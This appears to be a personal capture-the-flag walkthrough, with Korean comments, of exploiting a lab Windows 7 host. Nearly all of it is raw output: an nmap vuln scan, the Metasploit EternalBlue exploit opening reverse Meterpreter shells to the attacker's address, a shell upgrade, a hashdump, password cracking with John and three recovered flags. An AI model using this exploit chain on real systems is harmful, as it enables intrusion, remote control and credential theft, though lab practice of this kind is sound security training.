# 10.201.77.101

# nmap

oot@ip-10-201-111-150:~# nmap -sV -sC --script vuln -Pn -oN nmap.txt 10.201.77.101 --open
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-16 01:51 BST
mass*dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.201.77.101
Host is up (0.00047s latency).
Not shown: 911 closed ports, 80 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp open tcpwrapped
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rdp-vuln-ms12-020:
| VULNERABLE:
| MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
| State: VULNERABLE
| IDs: CVE:CVE-2012-0152
| Risk factor: Medium CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
| Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|  
| Disclosure date: 2012-03-13
| References:
| http://technet.microsoft.com/en-us/security/bulletin/ms12-020
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|  
| MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
| State: VULNERABLE
| IDs: CVE:CVE-2012-0002
| Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
| Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|  
| Disclosure date: 2012-03-13
| References:
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|* http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|\_ssl-ccs-injection: No reply from server (TIMEOUT)
|\_sslv2-drown:
49152/tcp open msrpc Microsoft Windows RPC
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
49153/tcp open msrpc Microsoft Windows RPC
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open msrpc Microsoft Windows RPC
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
49158/tcp open msrpc Microsoft Windows RPC
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
49160/tcp open msrpc Microsoft Windows RPC
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
MAC Address: 16:FF:D6:BB:07:01 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|\_smb-vuln-ms10-054: false
|\_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
| VULNERABLE:
| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
| State: VULNERABLE
| IDs: CVE:CVE-2017-0143
| Risk factor: HIGH
| A critical remote code execution vulnerability exists in Microsoft SMBv1
| servers (ms17-010).
|  
| Disclosure date: 2017-03-14
| References:
| https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.66 seconds

# msfconsole

# msf > search ms17-010

0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
1 \_ target: Automatic Target . . . .
2 \_ target: Windows 7 . . . .
3 \_ target: Windows Embedded Standard 7 . . . .
4 \_ target: Windows Server 2008 R2 . . . .
5 \_ target: Windows 8 . . . .
6 \_ target: Windows 8.1 . . . .
7 \_ target: Windows Server 2012 . . . .
8 \_ target: Windows 10 Pro . . . .
9 \_ target: Windows 10 Enterprise Evaluation . . . .
10 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
11 \_ target: Automatic . . . .
12 \_ target: PowerShell . . . .
13 \_ target: Native upload . . . .
14 \_ target: MOF upload . . . .
15 \_ AKA: ETERNALSYNERGY . . . .
16 \_ AKA: ETERNALROMANCE . . . .
17 \_ AKA: ETERNALCHAMPION . . . .
18 \_ AKA: ETERNALBLUE . . . .
19 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
20 \_ AKA: ETERNALSYNERGY . . . .
21 \_ AKA: ETERNALROMANCE . . . .
22 \_ AKA: ETERNALCHAMPION . . . .
23 \_ AKA: ETERNALBLUE . . . .
24 auxiliary/scanner/smb/smb_ms17_010 . normal No MS17-010 SMB RCE Detection
25 \_ AKA: DOUBLEPULSAR . . . .
26 \_ AKA: ETERNALBLUE . . . .
27 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution
28 \_ target: Execute payload (x64) . . . .
29 \_ target: Neutralize implant . . . .

Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

# msf exploit(windows/smb/ms17\*010_eternalblue) > set RHOSTS 10.201.21.43

# show options

RHOSTS => 10.201.21.43

# msf exploit(windows/smb/ms17_010_eternalblue) > run

msf exploit(windows/smb/ms17*010_eternalblue) > run
[*] Started reverse TCP handler on 192.168.65.3:4444
[*] 10.201.21.43:445 - Using auxiliary/scanner/smb/smb*ms17_010 as check
[+] 10.201.21.43:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '\*' in regular expression
[*] 10.201.21.43:445 - Scanned 1 of 1 hosts (100% complete)
[+] 10.201.21.43:445 - The target is vulnerable.
[*] 10.201.21.43:445 - Connecting to target for exploitation.
[+] 10.201.21.43:445 - Connection established for exploitation.
[+] 10.201.21.43:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.201.21.43:445 - CORE raw buffer dump (42 bytes)
[*] 10.201.21.43:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
[*] 10.201.21.43:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
[*] 10.201.21.43:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
[+] 10.201.21.43:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.201.21.43:445 - Trying exploit with 12 Groom Allocations.
[*] 10.201.21.43:445 - Sending all but last fragment of exploit packet
[*] 10.201.21.43:445 - Starting non-paged pool grooming
[+] 10.201.21.43:445 - Sending SMBv2 buffers
[+] 10.201.21.43:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.201.21.43:445 - Sending final SMBv2 buffers.
[*] 10.201.21.43:445 - Sending last fragment of exploit packet!
[*] 10.201.21.43:445 - Receiving response from exploit packet
[+] 10.201.21.43:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.201.21.43:445 - Sending egg to corrupted connection.
[*] 10.201.21.43:445 - Triggering free of corrupted buffer.
[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.201.21.43:445 - Connecting to target for exploitation.
[+] 10.201.21.43:445 - Connection established for exploitation.
[+] 10.201.21.43:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.201.21.43:445 - CORE raw buffer dump (42 bytes)
[*] 10.201.21.43:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
[*] 10.201.21.43:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
[*] 10.201.21.43:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
[+] 10.201.21.43:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.201.21.43:445 - Trying exploit with 17 Groom Allocations.
[*] 10.201.21.43:445 - Sending all but last fragment of exploit packet
[*] 10.201.21.43:445 - Starting non-paged pool grooming
[+] 10.201.21.43:445 - Sending SMBv2 buffers
[+] 10.201.21.43:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.201.21.43:445 - Sending final SMBv2 buffers.
[*] 10.201.21.43:445 - Sending last fragment of exploit packet!
[*] 10.201.21.43:445 - Receiving response from exploit packet
[+] 10.201.21.43:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.201.21.43:445 - Sending egg to corrupted connection.
[*] 10.201.21.43:445 - Triggering free of corrupted buffer.
[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.201.21.43:445 - Connecting to target for exploitation.
[+] 10.201.21.43:445 - Connection established for exploitation.
[+] 10.201.21.43:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.201.21.43:445 - CORE raw buffer dump (42 bytes)
[*] 10.201.21.43:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
[*] 10.201.21.43:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
[*] 10.201.21.43:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
[+] 10.201.21.43:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.201.21.43:445 - Trying exploit with 22 Groom Allocations.
[*] 10.201.21.43:445 - Sending all but last fragment of exploit packet
[*] 10.201.21.43:445 - Starting non-paged pool grooming
[+] 10.201.21.43:445 - Sending SMBv2 buffers
[+] 10.201.21.43:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.201.21.43:445 - Sending final SMBv2 buffers.
[*] 10.201.21.43:445 - Sending last fragment of exploit packet!
[*] 10.201.21.43:445 - Receiving response from exploit packet
[+] 10.201.21.43:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.201.21.43:445 - Sending egg to corrupted connection.
[*] 10.201.21.43:445 - Triggering free of corrupted buffer.
[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Exploit completed, but no session was created.
msf exploit(windows/smb/ms17_010_eternalblue) >

# fail

# set lhost tun0

lhost => tun0
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.8.136.212:4444
[*] 10.201.21.43:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.201.21.43:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.201.21.43:445 - Scanned 1 of 1 hosts (100% complete)
[+] 10.201.21.43:445 - The target is vulnerable.
[*] 10.201.21.43:445 - Connecting to target for exploitation.
[+] 10.201.21.43:445 - Connection established for exploitation.
[+] 10.201.21.43:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.201.21.43:445 - CORE raw buffer dump (42 bytes)
[*] 10.201.21.43:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
[*] 10.201.21.43:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
[*] 10.201.21.43:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
[+] 10.201.21.43:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.201.21.43:445 - Trying exploit with 12 Groom Allocations.
[*] 10.201.21.43:445 - Sending all but last fragment of exploit packet
[*] 10.201.21.43:445 - Starting non-paged pool grooming
[+] 10.201.21.43:445 - Sending SMBv2 buffers
[+] 10.201.21.43:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.201.21.43:445 - Sending final SMBv2 buffers.
[*] 10.201.21.43:445 - Sending last fragment of exploit packet!
[*] 10.201.21.43:445 - Receiving response from exploit packet
[+] 10.201.21.43:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.201.21.43:445 - Sending egg to corrupted connection.
[*] 10.201.21.43:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.201.21.43
[+] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.201.21.43:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.8.136.212:4444 -> 10.201.21.43:49193) at 2025-09-16 14:41:45 +0000

# CTF 환경 -> local host setting required -> so then WIN!

# ctrl + z | background

# sessions

meterpreter >
Background session 1? [y/N]y
[-] Unknown command: y. Run the help command for more details.
msf exploit(windows/smb/ms17_010_eternalblue) > sessions

# Active sessions

Id Name Type Information Connection

---

1 meterpreter x64/windows NT AUTHORITY\SYSTEM @ JON-PC 10.8.136.212:4444 -> 10.201.21.43:49193 (10.201.21.43)

# 이미 쉘을 얻었으므로 post 그리고 meterpreter 로 업그레이드 하는 모듈 검색하기

# msf exploit(windows/smb/ms17_010_eternalblue) > search type:post meterpreter

---

0 post/windows/manage/archmigrate . normal No Architecture Migrate
1 post/windows/manage/execute_dotnet_assembly . normal No Execute .NET Assembly
2 post/windows/manage/forward_pageant . normal No Forward SSH Agent Requests To Remote Pageant
3 post/windows/manage/make_token . normal No Make Token Command
4 \_ AKA: make_token . . . .
5 \_ AKA: maketoken . . . .
6 post/multi/gather/run_console_rc_file . normal No Multi Gather Run Console Resource File
7 post/multi/gather/multi_command . normal No Multi Gather Run Shell Command Resource File
8 post/multi/gather/ubiquiti_unifi_backup . normal No Multi Gather Ubiquiti UniFi Controller Backup
9 post/multi/manage/autoroute . normal No Multi Manage Network Route via Meterpreter Session
10 post/multi/manage/record_mic . normal No Multi Manage Record Microphone
11 post/multi/manage/screenshare . normal No Multi Manage the screen of the target meterpreter session
12 post/multi/recon/local_exploit_suggester . normal No Multi Recon Local Exploit Suggester
13 post/multi/manage/shell_to_meterpreter . normal No Shell to Meterpreter Upgrade
14 post/windows/gather/arp_scanner . normal No Windows Gather ARP Scanner
15 post/windows/manage/multi_meterpreter_inject . normal No Windows Manage Inject in Memory Multiple Payloads
16 post/windows/manage/powershell/exec_powershell . normal No Windows Manage PowerShell Download and/or Execute
17 post/windows/manage/priv_migrate . normal No Windows Manage Privilege Based Process Migration
18 post/windows/manage/migrate . normal No Windows Manage Process Migration
19 post/windows/manage/exec_powershell . normal No Windows PowerShell Execution Post Module
20 post/windows/gather/credentials/pulse_secure . normal Yes Windows Pulse Secure Connect Client Saved Password Extractor

Interact with a module by name or index. For example info 20, use 20 or use post/windows/gather/credentials/pulse_secure

msf exploit(windows/smb/ms17_010_eternalblue) >

# 13번 -> use post/multi/manage/shell_to_meterpreter

# show options

![](https://velog.velcdn.com/images/agnusdei1207/post/f679cc60-7cd1-4b80-a309-0ca914eb3c87/image.png)

msf post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

Name Current Setting Required Description

---

HANDLER true yes Start an exploit/multi/handler to receive the connection
LHOST no IP of host that will receive the connection from the payload (Will try to auto detect).
LPORT 4433 yes Port for payload to connect to.
SESSION yes The session to run this module on

# msf post(multi/manage/shell_to_meterpreter) > sessions -l

# Active sessions

Id Name Type Information Connection

---

1 meterpreter x64/windows NT AUTHORITY\SYSTEM @ JON-PC 10.8.136.212:4444 -> 10.201.21.43:49193 (10.201.21.43)

# 세션 지정 -> msf post(multi/manage/shell_to_meterpreter) > set SESSION 1

![](https://velog.velcdn.com/images/agnusdei1207/post/a1c1b181-af3f-43c7-921d-745d0cfe83de/image.png)

# run -> 성공 -> 새로운 세션 2 오픈

msf post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.136.212:4433
[*] Post module execution completed
msf post(multi/manage/shell_to_meterpreter) >
[*] Sending stage (203846 bytes) to 10.201.21.43
[*] Meterpreter session 2 opened (10.8.136.212:4433 -> 10.201.21.43:49197) at 2025-09-16 15:08:28 +0000
[*] Stopping exploit/multi/handler

# sessions -l

# sessions -i 2

[*] Starting interaction with 2...

meterpreter >

# 10.201.21.43

meterpreter > sysinfo
Computer : JON-PC
OS : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture : x64
System Language : en_US
Domain : WORKGROUP
Logged On Users : 0
Meterpreter : x64/windows

# sessions -> PC 사용자 이름 -> JON

Id Name Type Information Connection

---

1 meterpreter x64/windows NT AUTHORITY\SYSTEM @ JON-PC 10.8.136.212:4444 -> 10.201.21.43:49191 (10.201.21.43)
2 meterpreter x64/windows NT AUTHORITY\SYSTEM @ JON-PC 10.8.136.212:4433 -> 10.201.21.43:49192 (10.201.21.43)

# sessions -i 2

# meterpreter > hashdump

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

# kali -> john --format=NT --wordlist=rockyou.txt hash

# john --wordlist=rockyou.txt hash

Warning: detected hash type "LM", but the string is also recognized as "NT"
Use the "--format=NT" option to force loading these as that type instead
Using default input encoding: UTF-8
Using default target encoding: CP850
Loaded 1 password hash (LM [DES 256/256 AVX2])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
(Jon)  
1g 0:00:00:00 DONE (2025-09-17 14:58) 25.00g/s 1228Kp/s 1228Kc/s 1228KC/s 123456..MEME13
Use the "--show --format=LM" options to display all of the cracked passwords reliably
Session completed.

# john --format=NT --wordlist=rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22 (Jon)  
1g 0:00:00:00 DONE (2025-09-17 14:59) 1.075g/s 10968Kp/s 10968Kc/s 10968KC/s alr19882006..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.

# alqfna22 -> found

# meterpreter > search -f \*.txt

# meterpreter > cat c:\flag1.txt

[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > shell
Process 1552 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd ..
cdcd ..

C:\Windows>cd ..
cdcd ..
'cdcd' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows>cd ..
cd ..

C:\>type flag1.txt
type flag1.txt
flag{access_the_machine}

# background -> Background channel 2? [y/N] y

# meterpreter > search -f flag\*.txt

# Found 3 results...

Path Size (bytes) Modified (UTC)

---

c:\Users\Jon\Documents\flag3.txt 37 2019-03-17 19:26:36 +0000
c:\Windows\System32\config\flag2.txt 34 2019-03-17 19:32:48 +0000
c:\flag1.txt 24 2019-03-17 19:27:21 +0000

# C:\Windows\System32\config>type flag2.txt

type flag2.txt
flag{sam_database_elevated_access}

type c:\Users\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}
